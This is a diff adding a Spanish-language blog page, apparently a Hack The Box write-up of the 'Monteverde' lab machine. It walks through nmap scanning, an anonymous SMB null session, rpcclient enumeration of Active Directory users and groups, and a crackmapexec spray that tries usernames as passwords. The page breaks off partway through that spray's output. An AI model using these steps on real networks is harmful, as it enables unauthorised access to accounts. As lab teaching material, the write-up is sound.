@@ -1,0 +1,1106 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Monteverde - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Monteverde en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Monteverde">
+<meta property="og:url" content="http://localhost:4000/htb-monteverde/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Monteverde en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-monteverde/monteverde.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-01-15T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-monteverde/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Monteverde</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Intelligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Monteverde">
+    <meta itemprop="description" content="Resolución de la máquina Monteverde en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="January 15, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Monteverde
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-01-15T00:00:00-06:00">January 15, 2022 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-monteverde/banner-monteverde.jpg" alt="" /></p>
+
+<h2 id="monteverde">Monteverde</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.172.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.172
+PING 10.10.10.172 <span class="o">(</span>10.10.10.172<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.172: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>137 ms
+
+<span class="nt">---</span> 10.10.10.172 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 136.923/136.923/136.923/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.172 <span class="nt">-oG</span> allPorts
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-15 16:52 CST
+Initiating SYN Stealth Scan at 16:52        
+Scanning 10.10.10.172 <span class="o">[</span>65535 ports]          
+Discovered open port 53/tcp on 10.10.10.172   
+Discovered open port 139/tcp on 10.10.10.172  
+Discovered open port 445/tcp on 10.10.10.172  
+Discovered open port 135/tcp on 10.10.10.172  
+Discovered open port 636/tcp on 10.10.10.172 
+Discovered open port 3268/tcp on 10.10.10.172
+Discovered open port 49674/tcp on 10.10.10.172
+Discovered open port 49673/tcp on 10.10.10.172
+Discovered open port 49693/tcp on 10.10.10.172
+Discovered open port 49676/tcp on 10.10.10.172
+Discovered open port 9389/tcp on 10.10.10.172
+Discovered open port 593/tcp on 10.10.10.172
+Discovered open port 49667/tcp on 10.10.10.172                                                                                   
+Discovered open port 5985/tcp on 10.10.10.172
+Discovered open port 389/tcp on 10.10.10.172  
+Discovered open port 3269/tcp on 10.10.10.172
+Discovered open port 88/tcp on 10.10.10.172      
+Discovered open port 464/tcp on 10.10.10.172                                                                                     
+Completed SYN Stealth Scan at 16:52, 26.44s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.172               
+Host is up, received user-set <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>  
+Scanned at 2022-01-15 16:52:04 CST <span class="k">for </span>27s      
+Not shown: 65517 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49667/tcp open  unknown          syn-ack ttl 127
+49673/tcp open  unknown          syn-ack ttl 127
+49674/tcp open  unknown          syn-ack ttl 127
+49676/tcp open  unknown          syn-ack ttl 127
+49693/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>26.52 seconds
+           Raw packets sent: 131064 <span class="o">(</span>5.767MB<span class="o">)</span> | Rcvd: 30 <span class="o">(</span>1.320KB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.172
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49693
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49693 10.10.10.172 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-15 16:53 CST
+Nmap scan report <span class="k">for </span>10.10.10.172
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2022-01-15 22:53:31Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49676/tcp open  msrpc         Microsoft Windows RPC
+49693/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: MONTEVERDE<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   <span class="nb">date</span>: 2022-01-15T22:54:26
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>101.32 seconds
+</code></pre></div></div>
+
+<p>Vemos el puerto 445 abierto, así que trataremos de conectarnos a través de una <strong><em>Null Session</em></strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.172 <span class="nt">-N</span>
+Anonymous login successful
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+SMB1 disabled <span class="nt">--</span> no workgroup available
+❯ smbmap <span class="nt">-H</span> 10.10.10.172 <span class="nt">-u</span> <span class="s1">'null'</span>
+<span class="o">[!]</span> Authentication error on 10.10.10.172
+❯ smbmap <span class="nt">-H</span> 10.10.10.172 <span class="nt">-u</span> <span class="s1">''</span>
+<span class="o">[</span>+] IP: 10.10.10.172:445        Name: 10.10.10.172
+</code></pre></div></div>
+
+<p>No vemos nada interesante, así que ahora vamos a tratar de ocupar <code class="language-plaintext highlighter-rouge">rpcclient</code> para ver si podemos conectarnos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-U</span> <span class="s1">''</span> 10.10.10.172 <span class="nt">-N</span>
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+user:[Guest] rid:[0x1f5]
+user:[AAD_987d7f2f57d2] rid:[0x450]
+user:[mhope] rid:[0x641]
+user:[SABatchJobs] rid:[0xa2a]
+user:[svc-ata] rid:[0xa2b]
+user:[svc-bexec] rid:[0xa2c]
+user:[svc-netapp] rid:[0xa2d]
+user:[dgalanos] rid:[0xa35]
+user:[roleary] rid:[0xa36]
+user:[smorgan] rid:[0xa37]
+rpcclient <span class="nv">$&gt;</span>
+</code></pre></div></div>
+
+<p>Tenemos la capacidad de obtener información de <strong>Active Directory</strong> y para facilitarnos las cosas, haremos uso de la herramienta <a href="https://github.com/s4vitar/rpcenum">rpcenum</a> para dumpear la información que nos interesa.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcenum
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uso: rpcenum
+
+        e<span class="o">)</span> Enumeration Mode
+
+                DUsers <span class="o">(</span>Domain Users<span class="o">)</span>
+                DUsersInfo <span class="o">(</span>Domain Users with info<span class="o">)</span>
+                DAUsers <span class="o">(</span>Domain Admin Users<span class="o">)</span>
+                DGroups <span class="o">(</span>Domain Groups<span class="o">)</span>
+                All <span class="o">(</span>All Modes<span class="o">)</span>
+
+        i<span class="o">)</span> Host IP Address
+
+        h<span class="o">)</span> Show this <span class="nb">help </span>pannel
+</code></pre></div></div>
+
+<ul>
+  <li>Domain Users</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcenum <span class="nt">-e</span> DUsers <span class="nt">-i</span> 10.10.10.172
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerating Domain Users...
+
+  +                   +
+  | Users             |
+  +                   +
+  | Guest             |
+  | AAD_987d7f2f57d2  |
+  | mhope             |
+  | SABatchJobs       |
+  | svc-ata           |
+  | svc-bexec         |
+  | svc-netapp        |
+  | dgalanos          |
+  | roleary           |
+  | smorgan           |
+  +                   +
+</code></pre></div></div>
+
+<ul>
+  <li>Domain Users with info</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcenum <span class="nt">-e</span> DUsersInfo <span class="nt">-i</span> 10.10.10.172
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Listing domain <span class="nb">users </span>with description...
+
+  +                   +                                                                                                                                                    +
+  | User              | Description                                                                                                                                        |
+  +                   +                                                                                                                                                    +
+  | Guest             | Built-in account <span class="k">for </span>guest access to the computer/domain                                                                                           |
+  | AAD_987d7f2f57d2  | Service account <span class="k">for </span>the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.  |
+  +                   +                                                                                                                                                    +
+</code></pre></div></div>
+
+<ul>
+  <li>Domain Admin Users</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcenum <span class="nt">-e</span> DAUsers <span class="nt">-i</span> 10.10.10.172
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerating Domain Admin Users...
+
+  +                   +
+  | DomainAdminUsers  |
+  +                   +
+</code></pre></div></div>
+
+<ul>
+  <li>Domain Groups</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcenum <span class="nt">-e</span> DGroups <span class="nt">-i</span> 10.10.10.172
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumerating Domain Groups...
+
+  +                                          +                                                                                                                   +
+  | DomainGroup                              | Description                                                                                                       |
+  +                                          +                                                                                                                   +
+  | Enterprise Read-only Domain Controllers  | Members of this group are Read-Only Domain Controllers <span class="k">in </span>the enterprise                                          |
+  | Domain Users                             | All domain <span class="nb">users</span>                                                                                                  |
+  | Domain Guests                            | All domain guests                                                                                                 |
+  | Domain Computers                         | All workstations and servers joined to the domain                                                                 |
+  | Group Policy Creator Owners              | Members <span class="k">in </span>this group can modify group policy <span class="k">for </span>the domain                                                      |
+  | Cloneable Domain Controllers             | Members of this group that are domain controllers may be cloned.                                                  |
+  | Protected Users                          | Members of this group are afforded additional protections against authentication security threats. See http       |
+  | DnsUpdateProxy                           | DNS clients <span class="nb">who </span>are permitted to perform dynamic updates on behalf of some other clients <span class="o">(</span>such as DHCP servers<span class="o">)</span><span class="nb">.</span>  |
+  | Azure Admins                             |                                                                                                                   |
+  | File Server Admins                       |                                                                                                                   |
+  | Call Recording Admins                    |                                                                                                                   |
+  | Reception                                |                                                                                                                   |
+  | Operations                               |                                                                                                                   |
+  | Trading                                  |                                                                                                                   |
+  | HelpDesk                                 |                                                                                                                   |
+  | Developers                               |                                                                                                                   |
+  +                                          +                                                                                                                   +
+</code></pre></div></div>
+
+<p>Con la información que tenemos, ya debemos ver un grupo del cual podriamos abusar <strong>Azure Admins</strong> ya que como buen atacante vamos a ir por la administración del dominio y comprometer los equipos; por lo tanto, vamos a ver que usuarios pertenecen a dicho grupo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-U</span> <span class="s1">''</span> 10.10.10.172 <span class="nt">-N</span>
+rpcclient <span class="nv">$&gt;</span> enumdomgroups
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[DnsUpdateProxy] rid:[0x44e]
+group:[Azure Admins] rid:[0xa29]
+group:[File Server Admins] rid:[0xa2e]
+group:[Call Recording Admins] rid:[0xa2f]
+group:[Reception] rid:[0xa30]
+group:[Operations] rid:[0xa31]
+group:[Trading] rid:[0xa32]
+group:[HelpDesk] rid:[0xa33]
+group:[Developers] rid:[0xa34]
+rpcclient <span class="nv">$&gt;</span>
+rpcclient <span class="nv">$&gt;</span> querygroupmem 0xa29
+        rid:[0x1f4] attr:[0x7]
+        rid:[0x450] attr:[0x7]
+        rid:[0x641] attr:[0x7]
+rpcclient <span class="nv">$&gt;</span>
+rpcclient <span class="nv">$&gt;</span> queryuser 0x1f4                                                                                                     
+result was NT_STATUS_ACCESS_DENIED                                                                                               
+rpcclient <span class="nv">$&gt;</span>
+rpcclient <span class="nv">$&gt;</span> queryuser 0x450                                                                                                     
+        User Name   :   AAD_987d7f2f57d2                                                                                         
+        Full Name   :   AAD_987d7f2f57d2                                                                                         
+        Home Drive  :                                                                                                            
+        Dir Drive   :      
+        Profile Path:        
+        Logon Script:        
+        Description :   Service account <span class="k">for </span>the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309a
+dfc172d9 running on computer MONTEVERDE.
+        Workstations:      
+        Comment     :                                           
+        Remote Dial :                                           
+        Logon Time               :      sáb, 15 ene 2022 16:53:30 CST
+        Logoff Time              :      mié, 31 dic 1969 18:00:00 CST
+        Kickoff Time             :      mié, 31 dic 1969 18:00:00 CST
+        Password last <span class="nb">set </span>Time   :      jue, 02 ene 2020 16:53:25 CST
+        Password can change Time :      vie, 03 ene 2020 16:53:25 CST
+        Password must change Time:      mié, 13 sep 30828 21:48:05 CDT
+        unknown_2[0..31]...
+        user_rid :      0x450
+        group_rid:      0x201
+        acb_info :      0x00000210
+        fields_present: 0x00ffffff
+        logon_divs:     168
+        bad_password_count:     0x00000000
+        logon_count:    0x0000000a
+        padding1[0..7]...
+        logon_hrs[0..21]...
+rpcclient <span class="nv">$&gt;</span>
+rpcclient <span class="nv">$&gt;</span> queryuser 0x641
+        User Name   :   mhope
+        Full Name   :   Mike Hope
+        Home Drive  :   <span class="se">\\</span>monteverde<span class="se">\u</span>sers<span class="nv">$\</span>mhope
+        Dir Drive   :   H:
+        Profile Path:
+        Logon Script:
+        Description :
+        Workstations:
+        Comment     :
+        Remote Dial :
+        Logon Time               :      vie, 03 ene 2020 07:29:59 CST
+        Logoff Time              :      mié, 31 dic 1969 18:00:00 CST
+        Kickoff Time             :      mié, 13 sep 30828 21:48:05 CDT
+        Password last <span class="nb">set </span>Time   :      jue, 02 ene 2020 17:40:06 CST
+        Password can change Time :      vie, 03 ene 2020 17:40:06 CST
+        Password must change Time:      mié, 13 sep 30828 21:48:05 CDT
+        unknown_2[0..31]...
+        user_rid :      0x641
+        group_rid:      0x201
+        acb_info :      0x00000210
+        fields_present: 0x00ffffff
+        logon_divs:     168
+        bad_password_count:     0x00000000
+        logon_count:    0x00000002
+        padding1[0..7]...
+        logon_hrs[0..21]...
+rpcclient <span class="nv">$&gt;</span> 
+</code></pre></div></div>
+
+<p>Vemos tres usuarios de los cuales podemos ver la información de dos: <strong>AAD_987d7f2f57d2</strong> y <strong>mhope</strong>. Como no tenemos nada más, vamos a extraer todos los usuarios y con ayuda de <code class="language-plaintext highlighter-rouge">crackmapexec smb</code> vamos a validar si dentro de los usuarios podrian ser contraseñas.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-U</span> <span class="s1">''</span> 10.10.10.172 <span class="nt">-c</span> <span class="s2">"enumdomusers"</span> <span class="nt">-N</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[.*?\]'</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'0x'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span>
+Guest
+AAD_987d7f2f57d2
+mhope
+SABatchJobs
+svc-ata
+svc-bexec
+svc-netapp
+dgalanos
+roleary
+smorgan
+❯ rpcclient <span class="nt">-U</span> <span class="s1">''</span> 10.10.10.172 <span class="nt">-c</span> <span class="s2">"enumdomusers"</span> <span class="nt">-N</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\[.*?\]'</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'0x'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> ../content/domainUsers.txt
+❯ crackmapexec smb 10.10.10.172 <span class="nt">-u</span> domainUsers.txt <span class="nt">-p</span> domainUsers.txt
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:Guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:svc-ata STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:svc-bexec STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:svc-netapp STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:dgalanos STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:roleary STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\G</span>uest:smorgan STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\A</span>AD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\A</span>AD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\A</span>AD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\A</span>AD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\A</span>AD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\A</span>AD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\A</span>AD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\A</span>AD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\A</span>AD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       <span class="o">[</span>-] MEGABANK.LOCAL<span class="se">\A</span>AD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE 
